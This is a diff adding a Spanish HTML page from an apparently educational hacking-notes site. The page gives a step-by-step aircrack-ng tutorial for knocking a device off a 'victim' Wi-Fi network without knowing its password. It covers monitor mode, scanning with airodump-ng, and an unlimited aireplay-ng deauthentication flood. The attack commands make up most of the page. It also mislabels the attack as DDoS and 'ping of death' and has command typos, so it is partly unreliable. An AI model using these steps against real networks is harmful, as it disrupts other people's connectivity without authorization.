@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="ddosWifi.css">
+    <link rel="stylesheet" href="/Páginas/navegador.css">
+</head>
+
+<body>
+    <!-- /*barra superior navegación*/ -->
+    <nav>
+        <a href="/index.html" class="logo"><img src="/imagenes/HackMyNotesCorte.jpeg" alt="HackMyNotes"></a>
+        <div class="nav-links">
+            <a href="#">Inicio</a>
+            <div class="apuntes">
+                <a href="Páginas/apuntes.html">Apuntes</a>
+                <div class="apuntes-contenido">
+                    <a href="/Páginas/Wi-Fi/redes.html">Redes Wifi</a>
+                    <a href="/Páginas/Social/Social.html">Ingeniería Social</a>
+                    <a href="#anonimato">Anonimato</a>
+                    <a href="#bluetooth">Bluetooth</a>
+                    <a href="#linux">Linux</a>
+                    <a href="#Otros">Demás utilidades</a>
+                </div>
+            </div>
+            <a href="#">Contacto</a>
+            <a href="#">Acerca de</a>
+        </div>
+    </nav>
+    <!--EXPLICACIONES-->
+    <h1 class="texto-style t-s-tit" style="text-align: center;">Redes Wifi</h1>
+    <hr>
+    <h2 class="texto-style t-s-sub">Ataques DDOS de desconexión de un dispositivo por Wi-Fi</h2>
+    <!--VISUALIZAR ADAPTADORES DE RED-->
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>Bash</span>
+        </div>
+        <div class="terminal-body">
+            <pre>$ iw config</pre>
+        </div>
+        <div class="texto-style t-s-terminal">
+            este comando se usa para visualizar nuestras tarjetas de red disponibles, de esta información nos importa el
+            modo de la tarjeta
+            (buscamos estar en modo monitos)
+        </div>
+    </div>
+    <h3 class="texto-style">En el siguiente paso tendremos que tener instalada la herramienta aircrack-ng</h3>
+    <!--INSTALACION DE HERRAMIENTA-->
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>Bash</span>
+        </div>
+        <div class="terminal-body">
+            <pre>$ sudo apt update</pre>
+            <div class="terminal-footer">
+                realizamos una actualización rápida del sistema
+            </div>
+        </div>
+        <div class="terminal-body">
+            $ sudo apt-install aircrack-ng
+            <div class="terminal-footer">
+                instalamos aircrack-ng
+            </div>
+        </div>
+    </div>
+    <h3 class="texto-style">Ahora podremos usar la herramienta </h3>
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>Bash</span>
+        </div>
+        <div class="terminal-body">
+            <pre>$ sudo airmon-ng "nombre del adaptador de red"</pre>
+            <div class="texto-style t-s-terminal">
+                Nos ayudará a poner en modo monitor a nuestro adaptador. <br>
+                El modo monitor se encarga de escuchar todos y cada uno de los paquetes que hay en el “aire” y tiene la
+                posibilidad de capturarlos con diferentes programas
+            </div>
+        </div>
+        <div class="terminal-footer">
+            Usualmente los adaptadores tienen por nombre wlan0 o wlan1, después de activar el modo monitor pasaría a
+            llamarse wlan0mon o wlan1mon
+        </div>
+    </div>
+    <h3 class="texto-style">El siguiente paso será escanear en busca de la red víctima </h3>
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>Bash</span>
+        </div>
+        <div class="terminal-body">
+            <pre>$ sudo airodump-ng --band a "nombre del adaptador"</pre>
+            <div class="terminal-footer">Para realizar el escaneo de redes 5GHz</div>
+            <pre>$ sudo airodump-ng --band b "nombre del adaptador"</pre>
+            <div class="terminal-footer">Escanea y captura paquetes en la banda de 2.4 GHz, específicamente en los
+                canales utilizados por el estándar 802.11b</div>
+            <pre>$ sudo airodump-ng --band g "nombre del adaptador"</pre>
+            <div class="terminal-footer">Escanea y capturar paquetes en la banda de 2.4 GHz, pero en los canales
+                utilizados por el estándar 802.11g</div>
+        </div>
+    </div>
+    <div class="imagen-container ">
+        <img src="/imagenes/airodumpred.png" alt="Auditoria red">
+        <div class="pie-de-foto t-s-terminal">Aqui podemos ver el listado con información importante <br>de cada red de nuestra zona</div>
+    </div>
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>Bash</span>
+        </div>
+        <div class="terminal-body">
+            <pre>$ sudo airodump-ng --band < letra de la banda usada> -c 'Canal CH' --bssid < bssid de la red> < nombre_adaptador></pre>
+            <div class="terminal-footer">Aquí estaremos monitorizando únicamente la red "víctima"</div>
+        </div>
+    </div>
+    <div class="imagen-container ">
+        <img src="/imagenes/airodumpred2.png" alt="Auditoria red">
+        <div class="pie-de-foto t-s-terminal">Podemos observar como estamos monitorizando <br>
+        Una única red sin necesidad de estar <br>
+        conectados a ella, pudiendo ver <br>
+        los dispositivos conectados</div>
+    </div>
+    <h3 class="texto-style">De esta información nos interesa el BSSID y el STATION, este último es el número identificatorio de los dispositivos conectados <br>
+    Por último vamos a hacer el ataque final para desautenticar el dispositivo y que no pueda conectarse a la red víctima:</h3>
+    <div class="terminal">
+        <div class="terminal-header">
+            <span>Bash</span>
+        </div>
+        <div class="terminal-body">
+            <pre>$ aireplay-ng -0 0 -a < bssid> -c < station> < nombre_adaptador></pre>
+            <div class="terminal-footer">Este comando iniciará el “ping de la muerte” el cual desconectará de la red al dispositivo que hemos atacado</div>
+        </div>
+    </div>
+    <h3 class="texto-style t-s-final">Con esto concluye este ejercicio práctico en el que hemos realizado un ataque de desconexión a un dispositivo conectado a una red en la que no es necesario poseer la contraseña o estar conectados a ella</h3>
+</body>
+
+</html>
